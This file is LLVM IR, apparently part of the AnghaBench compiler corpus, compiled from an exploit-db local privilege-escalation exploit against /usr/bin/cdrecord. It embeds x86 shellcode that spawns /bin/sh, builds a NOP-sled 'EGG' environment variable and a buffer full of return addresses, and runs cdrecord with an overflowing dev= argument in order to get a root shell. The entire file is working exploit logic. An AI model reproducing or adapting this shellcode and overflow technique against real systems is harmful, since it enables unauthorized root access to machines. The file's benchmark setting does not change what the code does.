; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_19969.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_19969.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@__const.main.shell = private unnamed_addr constant [58 x i8] c"1\C0\B0P\89\C3\89\C1\B0G\CD\80\EB\1F^\89v\081\C0\88F\07\89F\0C\B0\0B\89\F3\8DN\08\8DV\0C\CD\801\DB\89\D8@\CD\80\E8\DC\FF\FF\FF/bin/sh\00", align 16
@RET = common dso_local global i64 0, align 8
@NOP = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [11 x i8] c"eip: 0x%x\0A\00", align 1
@.str.1 = private unnamed_addr constant [4 x i8] c"EGG\00", align 1
@.str.2 = private unnamed_addr constant [18 x i8] c"/usr/bin/cdrecord\00", align 1
@.str.3 = private unnamed_addr constant [9 x i8] c"cdrecord\00", align 1
@.str.4 = private unnamed_addr constant [5 x i8] c"dev=\00", align 1
@.str.5 = private unnamed_addr constant [12 x i8] c"/etc/passwd\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [58 x i8], align 16
  %7 = alloca [400 x i8], align 16
  %8 = alloca [80 x i8], align 16
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i64, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %12 = bitcast [58 x i8]* %6 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %12, i8* align 16 getelementptr inbounds ([58 x i8], [58 x i8]* @__const.main.shell, i32 0, i32 0), i64 58, i1 false)
  %13 = load i64, i64* @RET, align 8
  store i64 %13, i64* %11, align 8
  %14 = load i8**, i8*** %5, align 8
  %15 = getelementptr inbounds i8*, i8** %14, i64 1
  %16 = load i8*, i8** %15, align 8
  %17 = icmp ne i8* %16, null
  br i1 %17, label %18, label %25

18:                                               ; preds = %2
  %19 = load i64, i64* %11, align 8
  %20 = load i8**, i8*** %5, align 8
  %21 = getelementptr inbounds i8*, i8** %20, i64 1
  %22 = load i8*, i8** %21, align 8
  %23 = call i64 @atoi(i8* %22)
  %24 = sub nsw i64 %19, %23
  store i64 %24, i64* %11, align 8
  br label %25

25:                                               ; preds = %18, %2
  %26 = getelementptr inbounds [400 x i8], [400 x i8]* %7, i64 0, i64 0
  %27 = load i32, i32* @NOP, align 4
  %28 = call i32 @memset(i8* %26, i32 %27, i32 400)
  store i32 0, i32* %9, align 4
  br label %29

29:                                               ; preds = %38, %25
  %30 = load i32, i32* %9, align 4
  %31 = icmp slt i32 %30, 80
  br i1 %31, label %32, label %41

32:                                               ; preds = %29
  %33 = load i64, i64* %11, align 8
  %34 = load i32, i32* %9, align 4
  %35 = sext i32 %34 to i64
  %36 = getelementptr inbounds [80 x i8], [80 x i8]* %8, i64 0, i64 %35
  %37 = bitcast i8* %36 to i64*
  store i64 %33, i64* %37, align 1
  br label %38

38:                                               ; preds = %32
  %39 = load i32, i32* %9, align 4
  %40 = add nsw i32 %39, 4
  store i32 %40, i32* %9, align 4
  br label %29

41:                                               ; preds = %29
  store i32 300, i32* %9, align 4
  store i32 0, i32* %10, align 4
  br label %42

42:                                               ; preds = %55, %41
  %43 = load i32, i32* %10, align 4
  %44 = getelementptr inbounds [58 x i8], [58 x i8]* %6, i64 0, i64 0
  %45 = call i32 @strlen(i8* %44)
  %46 = icmp slt i32 %43, %45
  br i1 %46, label %47, label %60

47:                                               ; preds = %42
  %48 = load i32, i32* %10, align 4
  %49 = sext i32 %48 to i64
  %50 = getelementptr inbounds [58 x i8], [58 x i8]* %6, i64 0, i64 %49
  %51 = load i8, i8* %50, align 1
  %52 = load i32, i32* %9, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds [400 x i8], [400 x i8]* %7, i64 0, i64 %53
  store i8 %51, i8* %54, align 1
  br label %55

55:                                               ; preds = %47
  %56 = load i32, i32* %9, align 4
  %57 = add nsw i32 %56, 1
  store i32 %57, i32* %9, align 4
  %58 = load i32, i32* %10, align 4
  %59 = add nsw i32 %58, 1
  store i32 %59, i32* %10, align 4
  br label %42

60:                                               ; preds = %42
  %61 = getelementptr inbounds [80 x i8], [80 x i8]* %8, i64 0, i64 72
  store i8 0, i8* %61, align 8
  %62 = getelementptr inbounds [400 x i8], [400 x i8]* %7, i64 0, i64 399
  store i8 0, i8* %62, align 1
  %63 = load i64, i64* %11, align 8
  %64 = call i32 @printf(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str, i64 0, i64 0), i64 %63)
  %65 = getelementptr inbounds [400 x i8], [400 x i8]* %7, i64 0, i64 0
  %66 = call i32 @setenv(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.1, i64 0, i64 0), i8* %65, i32 1)
  %67 = getelementptr inbounds [80 x i8], [80 x i8]* %8, i64 0, i64 0
  %68 = call i32 @execl(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.2, i64 0, i64 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.3, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.4, i64 0, i64 0), i8* %67, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.5, i64 0, i64 0), i32 0)
  %69 = load i32, i32* %3, align 4
  ret i32 %69
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i64 @atoi(i8*) #2

declare dso_local i32 @memset(i8*, i32, i32) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @printf(i8*, i64) #2

declare dso_local i32 @setenv(i8*, i8*, i32) #2

declare dso_local i32 @execl(i8*, i8*, i8*, i8*, i8*, i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
